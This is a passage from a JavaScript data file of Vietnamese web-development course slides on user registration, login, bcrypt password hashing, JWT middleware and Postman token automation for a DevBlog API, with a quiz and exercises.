        { h: '1. Nhận & Validate Input', p: 'Kiểm tra `name`, `email` hợp lệ và `password` có độ dài từ 6 ký tự trở lên' },
        { h: '2. Kiểm tra trùng lặp', p: 'Truy vấn database xem email đã tồn tại chưa ➔ Nếu có trả về `409 Conflict`' },
        { h: '3. Băm mật khẩu với Bcrypt', p: 'Gọi `await hashPassword(password)` với salt rounds = 10' },
        { h: '4. Lưu người dùng vào CSDL', p: 'Tạo bản ghi trong bảng `users` với cột `password_hash`' },
        { h: '5. Phản hồi thành công', p: 'Trả về `201 Created` kèm thông tin user (TUYỆT ĐỐI ẨN trường `password_hash`)' }
      ],
      img: { src: 'oauth-token-flow.svg', cap: 'Quy trình tiếp nhận đăng ký tài khoản và cấp phát Token phiên (Wikipedia)', h: 500 }
    },
    {
      title: 'Hiện Thực Hóa auth.controller.js: Register & Login', badge: 'LIVE CODING',
      code: { file: 'src/controllers/auth.controller.js', lang: 'javascript', size: 'xs', src: `const { User } = require('../models');
const { hashPassword, comparePassword } = require('../utils/password');
const { signAccessToken } = require('../utils/jwt');
const asyncHandler = require('../utils/asyncHandler');
const AppError = require('../utils/AppError');

exports.register = asyncHandler(async (req, res) => {
  const { name, email, password } = req.body;

  const existingUser = await User.findOne({ where: { email } });
  if (existingUser) {
    throw new AppError('Địa chỉ email này đã được đăng ký tài khoản', 409);
  }

  const passwordHash = await hashPassword(password);
  const user = await User.create({ name, email, passwordHash, role: 'user' });

  res.status(201).json({
    success: true,
    message: 'Đăng ký tài khoản thành công',
    data: { id: user.id, name: user.name, email: user.email, role: user.role }
  });
});

exports.login = asyncHandler(async (req, res) => {
  const { email, password } = req.body;

  const user = await User.findOne({ where: { email } });
  if (!user) {
    throw new AppError('Email hoặc mật khẩu không chính xác', 401);
  }

  const isMatch = await comparePassword(password, user.passwordHash);
  if (!isMatch) {
    throw new AppError('Email hoặc mật khẩu không chính xác', 401);
  }

  const token = signAccessToken(user);

  res.status(200).json({
    success: true,
    message: 'Đăng nhập thành công',
    token,
    user: { id: user.id, name: user.name, email: user.email, role: user.role }
  });
});` },
      callout: { type: 'tip', t: 'Thông báo lỗi khi sai email hoặc sai mật khẩu **phải giống hệt nhau** ("Email hoặc mật khẩu không chính xác") để kẻ tấn công không thể dò xem email nào đã có trong hệ thống!' }
    },
    {
      title: 'Middleware Bảo Vệ: auth.middleware.js', layout: 'split', ratio: '1.15fr .85fr',
      code: { file: 'src/middlewares/auth.middleware.js', lang: 'javascript', size: 'sm', src: `const { verifyAccessToken } = require('../utils/jwt');
const AppError = require('../utils/AppError');

module.exports = (req, res, next) => {
  const authHeader = req.headers.authorization;

  // 1. Kiểm tra sự tồn tại của header Authorization:
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return next(new AppError('Vui lòng đăng nhập để thực hiện (Thiếu Bearer Token)', 401));
  }

  // 2. Tách lấy chuỗi token sau chữ "Bearer ":
  const token = authHeader.split(' ')[1];

  try {
    // 3. Xác minh tính hợp lệ và giải mã token:
    const decoded = verifyAccessToken(token);

    // 4. Gắn thông tin người dùng trực tiếp vào req để controller dùng:
    req.user = decoded;
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return next(new AppError('Phiên đăng nhập đã hết hạn, vui lòng đăng nhập lại', 401));
    }
    return next(new AppError('Mã xác thực không hợp lệ hoặc đã bị chỉnh sửa', 401));
  }
};` },
      bullets: [
        '**Sức mạnh của `req.user`**:',
        '• Sau khi đi qua middleware này, các controller phía sau có thể tự tin đọc `req.user.id`, `req.user.role` mà không cần phải truy vấn lại database!'
      ]
    },
    {
      title: 'Bảo Vệ Tuyến Đường API Bài Viết: post.routes.js', layout: 'split', ratio: '1.15fr .85fr',
      code: { file: 'src/routes/post.routes.js', lang: 'javascript', size: 'sm', src: `const express = require('express');
const router = express.Router();
const postController = require('../controllers/post.controller');
const auth = require('../middlewares/auth.middleware');

// Tuyến đường công khai (Public): Ai cũng đọc được bài viết
router.get('/', postController.getAllPosts);
router.get('/:id', postController.getPostById);

// Tuyến đường bảo vệ (Protected): BẮT BUỘC ĐĂNG NHẬP!
router.post('/', auth, postController.createPost);
router.put('/:id', auth, postController.updatePost);
router.delete('/:id', auth, postController.deletePost);

module.exports = router;` },
      bullets: [
        '**Chống mạo danh tác giả tuyệt đối**:',
        '• Trong hàm `postController.createPost`, ta gán tác giả bằng `userId: req.user.id`.',
        '• Dù client có cố tình gửi `{"userId": 999}` trong body JSON, server vẫn lấy ID thật từ token đã được ký số an toàn!'
      ]
    },
    {
      title: 'API Lấy Thông Tin Cá Nhân /api/v1/auth/me', layout: 'split', ratio: '1.15fr .85fr',
      code: { file: 'src/controllers/auth.controller.js', lang: 'javascript', size: 'sm', src: `// GET /api/v1/auth/me (Được bảo vệ bởi auth middleware)
exports.getProfile = asyncHandler(async (req, res) => {
  // Lấy ID người dùng từ token đã verify:
  const user = await User.findByPk(req.user.id, {
    attributes: { exclude: ['passwordHash'] }
  });

  if (!user) {
    throw new AppError('Người dùng không còn tồn tại trên hệ thống', 404);
  }

  res.status(200).json({
    success: true,
    data: user
  });
});` },
      bullets: [
        '**Tiêu chuẩn RESTful Endpoint `/me`**:',
        '• Cung cấp alias đường dẫn tiện lợi để ứng dụng Front-end tải lại thông tin đại diện của người dùng đang đăng nhập mà không cần phải ghi nhớ ID trên URL.'
      ]
    },
    {
      title: 'API Đổi Mật Khẩu An Toàn /api/v1/auth/change-password', layout: 'split', ratio: '1.15fr .85fr',
      code: { file: 'src/controllers/auth.controller.js', lang: 'javascript', size: 'sm', src: `exports.changePassword = asyncHandler(async (req, res) => {
  const { currentPassword, newPassword } = req.body;

  if (!currentPassword || !newPassword || newPassword.length < 6) {
    throw new AppError('Vui lòng cung cấp mật khẩu hiện tại và mật khẩu mới từ 6 ký tự', 400);
  }

  const user = await User.findByPk(req.user.id);

  // 1. Xác thực mật khẩu cũ:
  const isMatch = await comparePassword(currentPassword, user.passwordHash);
  if (!isMatch) {
    throw new AppError('Mật khẩu hiện tại không chính xác', 400);
  }

  // 2. Băm mật khẩu mới và lưu vào DB:
  user.passwordHash = await hashPassword(newPassword);
  await user.save();

  res.status(200).json({
    success: true,
    message: 'Đổi mật khẩu thành công, vui lòng đăng nhập lại'
  });
});` }
    },
    {
      title: 'Tự Động Hóa Kiểm Thử JWT Trên Postman', layout: 'split', ratio: '1.15fr .85fr',
      code: { file: 'Postman Tests Tab (Request Login)', lang: 'javascript', size: 'sm', src: `// Tự động trích xuất token sau khi Login thành công:
if (pm.response.code === 200) {
    const res = pm.response.json();
    if (res.token) {
        // Lưu token vào biến môi trường Postman:
        pm.environment.set("jwt_token", res.token);
        console.log("✅ Đã cập nhật jwt_token vào Environment!");
    }
}` },
      bullets: [
        '**Cấu hình kế thừa Authorization của Collection**:',
        '• Nhấp chuột vào tên Collection "DevBlog API" ➔ Chọn tab **Authorization**.',
        '• Chọn Type: **Bearer Token**, nhập giá trị: `{{jwt_token}}`.',
        '• Toàn bộ 50 requests con bên trong thư mục sẽ tự động được gắn Header `Authorization` mà bạn không cần phải copy paste token thủ công một lần nào nữa!'
      ]
    },
    {
      title: 'Kiểm tra nhanh kiến thức Buổi 9', badge: 'QUIZ',
      quiz: {
        q: 'Nếu một kẻ tấn công bắt được gói tin mạng chứa chuỗi JSON Web Token của người dùng, liệu kẻ đó có thể dùng công cụ chỉnh sửa lại Payload (ví dụ: đổi `role: "user"` thành `role: "admin"`) để vượt qua cổng kiểm tra của server hay không?',
        opts: [
          'Có thể sửa và dùng bình thường, vì Payload chỉ mã hóa Base64 nên giải mã rất dễ dàng.',
          'Sửa được Payload nhưng khi gửi lên, Server sẽ tính lại Chữ ký (Signature) bằng SECRET_KEY và phát hiện không khớp, lập tức chặn đứng bằng lỗi 401 Unauthorized.',
          'Không thể sửa được vì toàn bộ token JWT được mã hóa bí mật hai chiều.',
          'Chỉ sửa được nếu token đã hết hạn sử dụng.'
        ],
        a: 1,
        why: 'Base64Url chỉ là phương thức chuyển đổi bảng mã ký tự, bất kỳ ai cũng đọc và sửa được Payload. NHƯNG khi Server kiểm tra bằng thuật toán `HMAC(Header + Payload, SECRET)`, chữ ký mới tính ra sẽ **SAI LỆCH HOÀN TOÀN** so với chữ ký đính kèm trong token. Server lập tức từ chối request với mã lỗi 401 Unauthorized!'
      }
    }
  ],
  recap: [
    'Không bao giờ lưu mật khẩu Plain text; Luôn sử dụng **Bcrypt** với Salt ngẫu nhiên và cost factor 10.',
    'Phân biệt: **Authentication** (Xác thực danh tính: 401) vs **Authorization** (Kiểm tra quyền hạn: 403).',
    '**Stateless JWT**: Server không tốn RAM lưu session, dễ dàng mở rộng hàng ngàn node máy chủ.',
    'Giải phẫu JWT: **Header** (thuật toán), **Payload** (dữ liệu Base64 không bí mật), **Signature** (chữ ký số chống giả mạo).',
    'Chiến lược bảo mật cao cấp: Cặp đôi **Access Token (15m)** và **Refresh Token (7d)** với kỹ thuật Rotation.',
    'Xây dựng **Auth Middleware**: Bóc tách `Authorization: Bearer <token>`, giải mã và nạp `req.user` cho các route được bảo vệ.'
  ],
  exercises: [
    {
      level: 'warmup', time: 15, title: 'Thực nghiệm Tốc độ Bcrypt & Đo lường Cost Factor',
      desc: 'Hiểu cặn kẽ vì sao Bcrypt chống Brute-force hiệu quả.',
      tasks: [
        'Tạo file script `scratch/benchmark-bcrypt.js`.',
        'Viết vòng lặp đo thời gian thực thi của `bcrypt.hash` với các mức `rounds = 8, 10, 12, 14`.',
        'Ghi nhận thời gian chạy (ms) trên màn hình console và rút ra nhận xét về mức tăng trưởng theo hàm mũ $2^R$.'
      ],
      starter: {
        lang: 'javascript',
        src: `const bcrypt = require('bcrypt');
async function benchmark() {
  for (const rounds of [8, 10, 12, 14]) {
    const start = Date.now();
    await bcrypt.hash('mat_khau_thu_nghiem_123', rounds);
    console.log(\`Rounds \${rounds}: \${Date.now() - start}ms\`);
  }
}
benchmark();`
      }
    },
    {
      level: 'core', time: 30, title: 'Xây dựng API Đăng ký Tài khoản (/api/v1/auth/register)',
      desc: 'Hiện thực hóa tính năng khởi tạo người dùng mới an toàn.',
      tasks: [
        'Tạo route `POST /api/v1/auth/register` nhận `name`, `email`, `password`.',
        'Validate: Không để trống các trường, email đúng định dạng, password tối thiểu 6 ký tự.',
        'Kiểm tra email trùng lặp trong database ➔ Trả về mã lỗi 409 Conflict.',
        'Băm mật khẩu bằng `bcrypt.hash(password, 10)` và lưu vào MySQL.',
        'Trả về response 201 Created kèm thông tin user (đã ẩn `password_hash`).'
      ]
    },
    {
      level: 'core', time: 30, title: 'Xây dựng API Đăng nhập & Cấp JWT (/api/v1/auth/login)',
      desc: 'Xác minh danh tính và cấp phát mã thông báo điện tử.',
      tasks: [
        'Tạo route `POST /api/v1/auth/login` nhận `email` và `password`.',
        'Truy vấn user theo email, so sánh mật khẩu bằng `bcrypt.compare`.',
        'Nếu sai thông tin, trả về mã lỗi 401 với thông báo chung: "Email hoặc mật khẩu không chính xác".',
        'Sinh JWT Access Token có thời hạn 2h chứa `{ id, email, role }`.',
        'Trả về JSON `{ success: true, token, user }` và test thành công trên Postman.'
      ]
    },
    {
      level: 'core', time: 30, title: 'Viết Auth Middleware & Bảo vệ Tuyến đường Bài viết',
      desc: 'Áp dụng lá chắn bảo mật Bearer Token cho các endpoint nhạy cảm.',
      tasks: [
        'Xây dựng middleware `src/middlewares/auth.middleware.js`.',
        'Kiểm tra header `Authorization: Bearer <token>`, bóc tách token và verify bằng `jwt.verify`.',
        'Xử lý chuẩn xác các lỗi `TokenExpiredError` (401) và `JsonWebTokenError` (401).',
        'Gán `req.user = decoded` và gắn middleware vào route `POST /api/v1/posts`.',
        'Tự động lấy `userId = req.user.id` khi tạo bài viết mới trong database.'
      ]
    },
    {
      level: 'challenge', time: 40, title: 'API /api/v1/auth/me & Đổi Mật Khẩu An Toàn',
      desc: 'Hoàn thiện các tính năng quản lý tài khoản người dùng.',
      tasks: [
        'Tạo endpoint `GET /api/v1/auth/me` (có auth middleware): Trả về thông tin chi tiết của người dùng đang đăng nhập.',
        'Tạo endpoint `PUT /api/v1/auth/change-password` (có auth): Nhận `currentPassword` và `newPassword`.',
        'So sánh `currentPassword` với hash trong database ➔ Nếu sai ném lỗi 400 Bad Request.',
        'Băm `newPassword` mới và cập nhật vào database thành công.'
      ]
    },
    {
      level: 'homework', time: 35, title: 'Cấu hình Tự Động Hóa Bearer Token trong Postman',
      desc: 'Thiết lập môi trường làm việc kiểm thử API chuyên nghiệp.',
      tasks: [
        'Trong tab **Tests** của request Login trong Postman, viết script tự động lưu `token` vào biến môi trường `pm.environment.set("jwt_token", res.token)`.',
        'Thiết lập quyền kế thừa Authorization của toàn bộ Collection là `Bearer Token: {{jwt_token}}`.',
        'Chạy thử nghiệm toàn bộ các request tạo, sửa, xóa bài viết và xác nhận các request tự động có token mà không cần copy paste tay.'
      ]
    },
    {
      level: 'project', time: 45, title: 'Đồ án DevBlog Cột mốc 4a: Xác thực Người dùng Toàn diện',
      desc: 'Cột mốc hoàn thiện hệ thống Authentication cho DevBlog API.',
      tasks: [
        'Bảng `users` hoàn chỉnh với `password_hash` và trường `role` (user/admin).',
        'Hoàn thiện toàn bộ các endpoints: `/register`, `/login`, `/me`, `/change-password`.',
        'Áp dụng auth middleware bảo vệ các hành động tạo, sửa, xóa bài viết.',
        'Kiểm tra quyền sở hữu sơ bộ: Chỉ tác giả bài viết (`req.user.id === post.userId`) mới có quyền sửa/xóa bài viết.',
        'Export Postman Collection hoàn chỉnh nộp kèm mã nguồn dự án.'
      ]
    }
  ],
  project: {
    lead: '**Cột mốc 4a**: Hệ thống xác thực danh tính DevBlog API vận hành bảo mật trên nền tảng Bcrypt và JWT.',
    tasks: [
      'Mật khẩu người dùng được băm an toàn với Bcrypt 10 cost rounds',
      'Cấp phát JWT Access Token và bảo vệ các tuyến đường nhạy cảm',
      'Tự động nhận diện tác giả bài viết thông qua req.user từ token'
    ],
    callout: { type: 'tip', t: 'Buổi 10 chúng ta sẽ bổ sung **Authorization** (Phân quyền Admin vs Member) và thiết lập các lớp bảo vệ API chuyên sâu với Helmet, Rate-limit và Joi validation!' }
  }
};
